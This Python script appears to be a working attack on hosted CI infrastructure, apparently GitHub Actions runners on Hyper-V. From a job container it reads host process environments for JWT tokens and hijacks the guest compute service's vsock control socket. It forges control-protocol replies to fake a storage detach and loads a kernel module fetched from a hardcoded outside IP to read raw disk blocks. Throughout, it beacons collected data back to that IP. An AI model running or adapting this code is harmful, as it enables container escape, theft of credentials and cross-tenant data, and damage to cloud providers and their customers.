#!/usr/bin/env python3
"""Forge owned cleanup replies and test one StorVSP target after host detach."""

import base64
import ctypes
import fcntl
import glob
import hashlib
import json
import os
import re
import signal
import socket
import struct
import subprocess
import time
import urllib.parse
import urllib.request


RELAY = "http://16.146.243.72:8450"
NOTIFY = 0x30100101
MODIFY_REQUEST = 0x10100A01
WAIT_REQUEST = 0x10100601
GET_PROPERTIES_REQUEST = 0x10100901


def beacon(stage, fields):
    value = {"stage": stage, "time_ns": time.time_ns(), **fields}
    encoded = base64.urlsafe_b64encode(
        json.dumps(value, sort_keys=True, separators=(",", ":")).encode()
    ).decode()
    try:
        urllib.request.urlopen(
            RELAY + "/STORAGE_DETACH?d=" + encoded, timeout=2
        ).read()
    except OSError:
        pass


def process_census():
    result = {}
    for name in os.listdir("/hostproc"):
        if not name.isdigit():
            continue
        try:
            command = open(f"/hostproc/{name}/cmdline", "rb").read()
            environment = dict(
                item.split(b"=", 1)
                for item in open(f"/hostproc/{name}/environ", "rb").read().split(b"\0")
                if b"=" in item
            )
        except OSError:
            continue
        if command.startswith(b"/bin/gcs\0"):
            result["gcs"] = int(name)
        if b"scheduler_api_url" in environment and b"jwt_token" in environment:
            result["hca"] = int(name)
    return result


def owned_job_id():
    try:
        staged = open("/tmp/owned-job-cid").read().strip()
        if re.fullmatch(r"[0-9a-f]{64}", staged):
            return staged
    except OSError:
        pass
    pid = os.getpid()
    while pid > 1:
        try:
            executable = os.readlink(f"/hostproc/{pid}/exe")
            match = re.search(r"/run/gcs/c/([0-9a-f]{64})/rootfs/", executable)
            if match:
                return match.group(1)
            status = open(f"/hostproc/{pid}/status").read()
            pid = int(next(line.split()[1] for line in status.splitlines()
                           if line.startswith("PPid:")))
        except (OSError, StopIteration, ValueError):
            break
    candidates = []
    for path in glob.glob("/hostrun/runc/*/state.json"):
        try:
            state = json.load(open(path))
            pid = int(state["init_process_pid"])
            environment = open(f"/hostproc/{pid}/environ", "rb").read()
        except (OSError, ValueError, KeyError):
            continue
        if b"GITHUB_ACTIONS=true" in environment or b"GITHUB_RUN_ID=" in environment:
            candidates.append(str(state["id"]))
    if len(candidates) != 1:
        raise RuntimeError(f"job container census was not unique: {len(candidates)}")
    return candidates[0]


def gcs_channel(pid):
    libc = ctypes.CDLL(None, use_errno=True)
    pidfd = os.pidfd_open(pid)
    try:
        for target_fd in range(64):
            duplicate = libc.syscall(438, pidfd, target_fd, 0)
            if duplicate < 0:
                continue
            try:
                channel = socket.socket(fileno=duplicate)
                if (channel.family == socket.AF_VSOCK and
                        channel.getpeername() == (2, 0x40000000)):
                    return target_fd, channel
                channel.close()
            except OSError:
                os.close(duplicate)
    finally:
        os.close(pidfd)
    raise RuntimeError("GCS control channel unavailable")


def send(channel, message_type, request_id, value):
    body = json.dumps(value, separators=(",", ":")).encode()
    channel.sendall(struct.pack("<IIQ", message_type, 16 + len(body), request_id) + body)


def recv_exact(channel, size):
    value = bytearray()
    while len(value) < size:
        part = channel.recv(size - len(value))
        if not part:
            raise EOFError
        value.extend(part)
    return bytes(value)


def storage_target():
    device = os.path.realpath("/hostsys/block/sdc/device")
    address = os.path.basename(device)
    port, path_id, target, lun = map(int, address.split(":"))
    vmbus_ids = {
        os.path.basename(item) for item in glob.glob("/hostsys/bus/vmbus/devices/*")
    }
    controller = next((part for part in device.split("/") if part in vmbus_ids), "")
    if not controller:
        raise RuntimeError("StorVSP controller unavailable")
    return controller, port, path_id, target, lun


def probe(module, controller, port, path_id, target, lun, mode, size, blocks,
          lba=0, expected="-"):
    environment = os.environ.copy()
    environment.update({
        "KCORE_FAST": "1", "VSTOR_LBA": str(lba), "VSTOR_BLOCKS": str(blocks),
        "VSTOR_BYTES": str(size), "VSTOR_PATH": str(path_id),
        "VSTOR_TARGET": str(target), "VSTOR_LUN": str(lun),
        "VSTOR_EXPECT_SHA256": expected,
    })
    try:
        result = subprocess.run(
            ["python3", "/tmp/kcore_relid_load.py", module, str(mode),
             controller, str(port)],
            env=environment, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=12,
        )
    except subprocess.TimeoutExpired as error:
        captured = error.stdout or ""
        if isinstance(captured, bytes):
            captured = captured.decode(errors="replace")
        return {"mode": mode, "rc": "timeout", "transport": "",
                "data": captured[-120:]}
    lines = result.stdout.splitlines()
    transport = next(
        (line.removeprefix("MODULE_REPORT ") for line in lines
         if line.startswith(("MODULE_REPORT scsi:", "scsi:"))), ""
    )
    data = next((line.removeprefix("VSTOR_DATA ") for line in lines
                 if line.startswith("VSTOR_DATA ")), "")
    return {"mode": mode, "rc": result.returncode,
            "transport": transport[-240:], "data": data[:120]}


def owned_marker(sector_size):
    path = "/tmp/storage-detach-owned-marker"
    payload = (b"STORAGE-DETACH-OWNED\0" + os.urandom(64)).ljust(4096, b"Q")
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        os.write(fd, payload)
        os.fsync(fd)
    finally:
        os.close(fd)
    fd = os.open(path, os.O_RDONLY)
    try:
        mapping = bytearray(32 + 56 * 8)
        struct.pack_into("<QQIIII", mapping, 0, 0, 4096, 0, 0, 8, 0)
        fcntl.ioctl(fd, 0xC020660B, mapping, True)
    finally:
        os.close(fd)
    if struct.unpack_from("<I", mapping, 20)[0] < 1:
        raise RuntimeError("owned marker has no FIEMAP extent")
    logical, physical, length = struct.unpack_from("<QQQ", mapping, 32)
    if logical or length < 4096 or physical % sector_size:
        raise RuntimeError("owned marker extent did not validate")
    return physical // sector_size, 4096 // sector_size, hashlib.sha256(payload).hexdigest()


def pending_wait_contexts(gcs_pid, job_id):
    result = subprocess.run(
        ["python3", "/tmp/gcs_wait_context_scan.py", str(gcs_pid)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=20,
    )
    print(result.stdout, end="", flush=True)
    expected_cid_hash = hashlib.sha256(job_id.encode()).hexdigest()[:12]
    contexts = {}
    for line in result.stdout.splitlines():
        match = re.search(
            r"GCS_WAIT_CONTEXT ids=([0-9,]+) guest_pid=(\d+) timeout=(\d+) "
            r"cid_hash=([0-9a-f]{12})", line)
        if not match or match.group(4) != expected_cid_hash:
            continue
        ids = [int(value) for value in match.group(1).split(",")]
        if len(ids) == 1:
            contexts.setdefault(int(match.group(2)), set()).add(ids[0])
    return {pid: next(iter(ids)) for pid, ids in contexts.items() if len(ids) == 1}


state = process_census()
print(f"STORAGE_CONTROL census={state}", flush=True)
if not all(name in state for name in ("gcs", "hca")):
    raise SystemExit("required infrastructure process unavailable")

# Keep the duplicate control socket and this probe in the still-live HCA netns.
try:
    os.setns(os.open(f"/hostproc/{state['hca']}/ns/net", os.O_RDONLY))
except (AttributeError, OSError):
    pass
print("STORAGE_CONTROL hca-netns=true", flush=True)

job_id = owned_job_id()
print(f"STORAGE_CONTROL job={job_id[:12]}", flush=True)
fd, channel = gcs_channel(state["gcs"])
print(f"STORAGE_CONTROL gcs-fd={fd}", flush=True)
channel.settimeout(0.5)
controller, port, path_id, target, lun = storage_target()
print(f"STORAGE_CONTROL target={controller}/{port}:{path_id}:{target}:{lun}", flush=True)
sector_size = int(open("/hostsys/block/sdc/queue/logical_block_size").read())
marker_lba, marker_blocks, marker_sha256 = owned_marker(sector_size)
print(f"STORAGE_CONTROL marker={marker_lba}/{marker_sha256}", flush=True)
module = "/tmp/hvraw_vstor.ko"
urllib.request.urlretrieve(RELAY + "/hvraw_vstor.ko", module)
print("STORAGE_CONTROL module=true", flush=True)
before = [
    probe(module, controller, port, path_id, target, lun, 64, 36, 1),
    probe(module, controller, port, path_id, target, lun, 61, 4096,
          marker_blocks, marker_lba, marker_sha256),
]
print(f"STORAGE_CONTROL before={before}", flush=True)
wait_contexts = pending_wait_contexts(state["gcs"], job_id)
print(f"STORAGE_CONTROL wait-contexts={wait_contexts}", flush=True)
beacon("pre", {"job": job_id[:12], "gcs_fd": fd, "controller": controller,
               "address": f"{port}:{path_id}:{target}:{lun}",
               "marker_lba": marker_lba, "marker_sha256": marker_sha256,
               "probes": before, "wait_contexts": wait_contexts})

os.kill(state["gcs"], signal.SIGSTOP)
send(channel, NOTIFY, 0, {"ContainerId": job_id, "Type": "UnexpectedExit",
                          "Operation": "StorageDetachControl", "Result": 0})
print("STORAGE_CONTROL notification=true", flush=True)
beacon("notification", {"job": job_id[:12]})

seen = 0
acked_scsi = None
acked_scsi_at = None
post = []
wait_forged = set()
deadline = time.monotonic() + 55
while time.monotonic() < deadline:
    try:
        header = recv_exact(channel, 16)
        message_type, message_size, request_id = struct.unpack("<IIQ", header)
        if not 16 <= message_size <= (1 << 20):
            raise RuntimeError(f"invalid GCS frame {message_size}")
        body = recv_exact(channel, message_size - 16)
    except socket.timeout:
        if (acked_scsi and not post and
                time.monotonic() - acked_scsi_at >= 1.0):
            post.append({"after": acked_scsi, "trigger": "wait", "probes": [
                probe(module, controller, port, path_id, target, lun, 64, 36, 1),
                probe(module, controller, port, path_id, target, lun, 61, 4096,
                      marker_blocks, marker_lba, marker_sha256),
            ]})
            beacon("post", post[-1])
        continue
    except (EOFError, OSError, RuntimeError) as error:
        beacon("channel-end", {"seen": seen, "error": type(error).__name__,
                               "post": post})
        break

    seen += 1
    try:
        value = json.loads(body)
    except ValueError:
        value = {}
    request = value.get("Request", value)
    if not isinstance(request, dict):
        request = {}
    resource = str(request.get("ResourceType", ""))
    request_type = str(request.get("RequestType", ""))
    settings = request.get("Settings", {}) if isinstance(request.get("Settings"), dict) else {}
    current = {
        "seen": seen, "type": hex(message_type), "id": request_id,
        "resource": resource, "request": request_type,
        "controller": settings.get("Controller"), "lun": settings.get("Lun"),
        "body_bytes": len(body), "body_sha256": hashlib.sha256(body).hexdigest(),
        "body": body.decode(errors="replace")[:4096],
    }
    print(f"STORAGE_CONTROL host-frame={current}", flush=True)
    beacon("host-request", current)
    if acked_scsi and not post:
        post.append({"after": acked_scsi, "trigger": current, "probes": [
            probe(module, controller, port, path_id, target, lun, 64, 36, 1),
            probe(module, controller, port, path_id, target, lun, 61, 4096,
                  marker_blocks, marker_lba, marker_sha256),
        ]})
        beacon("post", post[-1])
    if message_type & 0xF0000000 != 0x10000000:
        beacon("unexpected-request", current)
        break
    response = {"Result": 0}
    if message_type == WAIT_REQUEST:
        response["ExitCode"] = 0
    elif message_type == GET_PROPERTIES_REQUEST:
        response["Properties"] = "{}"
    response_type = 0x20000000 | (message_type & 0x0FFFFFFF)
    send(channel, response_type, request_id, response)
    beacon("host-response", {"request_id": request_id, "type": hex(response_type),
                             "response": response})
    if message_type == 0x10100701:
        process_id = int(value.get("ProcessId", 0))
        wait_id = wait_contexts.get(process_id)
        if wait_id and wait_id not in wait_forged:
            wait_response = {"Result": 0, "ExitCode": 0}
            send(channel, 0x20100601, wait_id, wait_response)
            wait_forged.add(wait_id)
            beacon("pending-wait-response", {"process_id": process_id,
                                              "request_id": wait_id})
    if resource == "SCSIDevice" and request_type == "Remove":
        acked_scsi = current
        acked_scsi_at = time.monotonic()
        beacon("scsi-acked", current)

beacon("done", {"seen": seen, "acked_scsi": acked_scsi, "post": post})
